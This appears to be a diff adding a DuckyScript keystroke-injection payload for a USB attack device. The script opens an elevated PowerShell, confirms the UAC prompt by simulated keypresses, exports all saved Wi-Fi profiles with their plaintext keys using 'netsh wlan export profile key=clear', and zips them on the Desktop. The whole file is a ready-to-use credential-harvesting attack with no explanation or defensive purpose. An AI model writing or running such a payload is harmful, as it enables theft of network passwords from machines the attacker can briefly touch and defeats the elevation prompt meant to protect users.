@@ -1,0 +1,18 @@
+
+DELAY 500
+WINDOWS d
+DELAY 500
+WINDOWS r
+DELAY 800
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 1000
+LEFTARROW
+ENTER
+DELAY 800
+ALT y
+DELAY 500
+GUI UP
+DELAY 600
+STRING $folderDateTime = (Get-Date).ToString('d-M-y HHmmss'); $userDir = [Environment]::GetFolderPath("Desktop") + "\wifipass" + $folderDateTime; $fileSaveDir = New-Item ($userDir) -ItemType Directory; $date = Get-Date; netsh wlan export profile key=clear folder=$fileSaveDir; Compress-Archive -Path $fileSaveDir -DestinationPath "$([Environment]::GetFolderPath('Desktop'))\ResultsPassword.zip"; exit 
+ENTER
